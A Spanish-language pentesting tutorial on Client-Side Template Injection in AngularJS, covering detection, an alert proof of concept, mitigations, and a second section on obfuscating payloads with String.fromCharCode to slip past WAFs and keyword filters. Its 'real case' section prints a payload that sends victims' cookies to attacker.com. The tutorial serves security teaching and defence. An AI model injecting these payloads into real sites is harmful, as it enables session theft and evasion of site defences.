# CSTI - Client-Side Template Injection

## Introducción

En este documento vamos a explicar qué es una vulnerabilidad CSTI (Client-Side Template Injection), cómo detectarla, cómo explotarla y qué consecuencias puede tener. También veremos un caso práctico en un entorno controlado y un caso real documentado en el que esta vulnerabilidad fue aprovechada por un atacante.

Nuestro objetivo es comprender cómo funciona esta técnica, no solo para explotarla durante una auditoría, sino también para prevenir su aparición en desarrollos propios.

---

## ¿Qué es CSTI?

### Definición

La **Client-Side Template Injection (CSTI)** es una vulnerabilidad que ocurre cuando una aplicación web incorpora datos del usuario directamente en una plantilla del lado del cliente (JavaScript) sin la debida sanitización. Esta situación permite que el atacante inyecte y ejecute código malicioso en el navegador de la víctima.

A diferencia de las inyecciones de plantilla del lado del servidor (SSTI), en CSTI el motor de plantillas se ejecuta en el navegador, no en el servidor. Algunos motores comunes en el lado cliente son:

- AngularJS
- Vue.js
- Handlebars
- Mustache
- EJS

---

## ¿Cómo se detecta una CSTI?

Durante una auditoría o un pentest, podemos detectar una CSTI de la siguiente forma:

1. **Identificar campos que reflejan contenido HTML**: formularios, campos de búsqueda, comentarios, perfiles, etc.
2. **Probar payloads típicos del motor de plantillas sospechoso**:
   - Para AngularJS: `{{constructor.constructor('alert(1)')()}}`
   - Para Handlebars: `{{this}}`, `{{#with "suspicious"}}{{/with}}`
3. **Observar si hay ejecución de JavaScript sin intervención adicional**.
4. **Inspeccionar el código fuente o el JavaScript cargado** en busca del motor usado (`ng-app`, `Vue`, `Handlebars.compile()`...).

---

## Caso práctico: CSTI en AngularJS

### Escenario

Supongamos que estamos auditando una aplicación web que utiliza AngularJS para renderizar contenido dinámico en el navegador. En el perfil de usuario, se muestra el nombre del usuario utilizando AngularJS.

El código de la plantilla es algo como:

```html
<div>
  Bienvenido, {{ user.name }}.
</div>
````

Pero la aplicación no filtra lo que se muestra y refleja directamente cualquier dato recibido desde el servidor o desde un parámetro GET.

### Prueba de concepto (PoC)

En un campo visible del perfil o mediante un parámetro `GET`, probamos el siguiente payload:

```
{{constructor.constructor('alert("CSTI detectada")')()}}
```

Al cargar la página, se ejecuta `alert("CSTI detectada")` en el navegador. Esto confirma la existencia de la vulnerabilidad.

### Explicación

Este payload explota el motor AngularJS accediendo al constructor del constructor (`Function`) para ejecutar código arbitrario. No se necesita interacción del usuario, lo que demuestra una ejecución directa y peligrosa en el cliente.

---

## Caso real: HackerOne y CSTI en AngularJS

### Descripción

En 2016, se reportó un bug a través de HackerOne en una plataforma que usaba AngularJS para renderizar comentarios de usuarios. Un atacante logró inyectar una expresión maliciosa:

```html
{{constructor.constructor('fetch("https://attacker.com/steal?c="+document.cookie)')()}}
```

Esta expresión se ejecutaba cuando otro usuario visualizaba el comentario, enviando sus cookies al atacante.

### Consecuencias

- **Robo de sesión**: al capturar la cookie de sesión.
    
- **Movimiento lateral**: si se reutilizan tokens de autenticación.
    
- **Escalada de privilegios**: dependiendo del rol del usuario afectado.
    
- **XSS persistente**: mediante cargas automáticas o enlaces compartidos.
    

### Mitigación implementada

La plataforma corrigió el error filtrando correctamente los datos antes de ser insertados en la plantilla AngularJS, y además deshabilitaron las expresiones peligrosas con `ngSanitize`.

---

## Medidas de mitigación

Para prevenir este tipo de vulnerabilidades, debemos:

1. **Evitar interpolar directamente datos del usuario en plantillas**.
    
2. **Utilizar funciones de escape/sanitización del propio framework**.
    
3. **Activar políticas de seguridad (Content Security Policy)**.
    
4. **Deshabilitar funciones peligrosas o innecesarias del motor de plantillas**.
    
5. **Revisar el código JavaScript en busca de llamadas como `eval()` o `Function()`**.
    

---

## Conclusión

La CSTI es una vulnerabilidad grave que puede pasar desapercibida si no conocemos cómo funcionan los motores de plantillas del lado cliente. Su explotación puede llevar a XSS, robo de sesiones o incluso persistencia en aplicaciones SPA (Single Page Application).

Como pentesters, debemos probar sistemáticamente posibles puntos de inyección y conocer los payloads específicos según el motor en uso. Como desarrolladores, debemos aplicar validaciones estrictas y nunca confiar en la entrada del usuario.

---

# CSTI - Payload Ofuscado con `String.fromCharCode()`

## Introducción

En esta sección vamos a aprender cómo utilizar `String.fromCharCode()` para ofuscar un payload en una inyección de plantilla del lado cliente (CSTI). Esta técnica resulta útil cuando se desea evadir filtros, WAFs o mecanismos de detección automática que bloquean palabras clave como `alert`, `script`, etc.

---

## ¿Qué es `String.fromCharCode()`?

`String.fromCharCode()` es un método de JavaScript que recibe una serie de valores decimales y devuelve su representación en texto según la codificación Unicode.

Por ejemplo:

```javascript
String.fromCharCode(97,108,101,114,116) // "alert"
````

Esto nos permite construir comandos como `alert(1)` sin escribir explícitamente la palabra `alert`.

---

## Ejemplo práctico: CSTI en AngularJS ofuscado

### Escenario

Estamos analizando una aplicación vulnerable a CSTI que utiliza AngularJS. La siguiente carga útil es válida y ejecuta código en el navegador:

```html
{{constructor.constructor('alert(1)')()}}
```

Sin embargo, supongamos que hay un filtro que bloquea expresiones que contengan directamente la palabra `alert`. Podemos ofuscar el payload usando `String.fromCharCode()`.

---

## Conversión a decimal

Convertimos el string `'alert(1)'` a códigos Unicode decimales.

### Con JavaScript:

```javascript
'alert(1)'.split('').map(c => c.charCodeAt(0)).join(',')
// Resultado: 97,108,101,114,116,40,49,41
```

### Con Python:

```python
payload = 'alert(1)'
print(','.join([str(ord(c)) for c in payload]))
# Salida: 97,108,101,114,116,40,49,41
```

---

## Payload final ofuscado

El payload CSTI ofuscado quedaría así:

```html
{{constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}
```

Este payload ejecuta exactamente el mismo resultado que el original (`alert(1)`), pero es mucho más difícil de detectar por filtros simples que escanean palabras clave.

---

## Ventajas

- Evita filtros de palabras (`alert`, `onload`, `script`).
    
- Permite pasar por WAFs mal configurados.
    
- Se puede combinar con otras técnicas de evasión.
    

---

## Consideraciones

Aunque esta técnica es efectiva para evadir ciertos controles, es **relativamente sencilla de detectar** con una inspección manual del código o mediante herramientas más avanzadas de análisis. No obstante, sigue siendo una herramienta poderosa en contextos donde los filtros son básicos.

---

## Conclusión

Ofuscar payloads utilizando `String.fromCharCode()` es una forma inteligente de ejecutar código JavaScript sin levantar sospechas inmediatas. Esta técnica nos permite probar vectores de ataque en contextos donde los mecanismos de defensa están presentes, y forma parte de nuestro arsenal de pruebas como profesionales del pentesting.
